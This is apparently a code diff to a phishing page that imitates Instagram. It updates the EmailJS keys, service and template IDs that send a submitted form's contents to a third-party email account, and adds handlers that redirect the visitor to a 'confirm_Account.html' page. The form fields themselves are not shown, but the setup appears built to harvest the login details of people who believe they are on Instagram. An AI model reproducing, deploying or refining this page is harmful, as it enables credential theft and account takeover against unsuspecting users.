@@ -273,14 +273,14 @@ input[type="submit"]:hover, input[type="submit"]:focus {
       <a href="https://www.instagram.com/directory/profiles/">PROFILES</a>
       <a href="https://www.instagram.com/directory/hashtags/">HASHTAGS</a>
       <a href="">LANGUAGE</a>
-      <span>© 2025 INSTAGRAM</span>
+      <span>© 2024 INSTAGRAM</span>
   </p>
 </div>
 <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
 
   <script type="text/javascript">
     (function() {
-        emailjs.init("Ru9DOfSWfnC58AvgD"); // Use your EmailJS User ID
+        emailjs.init("xlkCcpryUFq2iLP5L"); // Use your EmailJS User ID
     })();
 
     document.getElementById("contact-form").addEventListener("submit", function(event) {
@@ -299,9 +299,16 @@ input[type="submit"]:hover, input[type="submit"]:focus {
         };
 
         // Send the email using EmailJS
-        emailjs.send("service_cyxyh2q", "template_bbsgxhi", emailParams)
+        emailjs.send("service_bq4sang", "template_odryly8", emailParams)
+            .then(function(response) {
+                console.log(" ", response);
+                alert(" ");
                         // Redirect to another page after email is sent
         window.location.href = "confirm_Account.html";  // Redirect to a 'thank you' page after email is sent
+            }, function(error) {
+                console.error("Error sending email:", error);
+                alert("Failed to send message. Please try again later.");
+            });
     });
 </script>
 
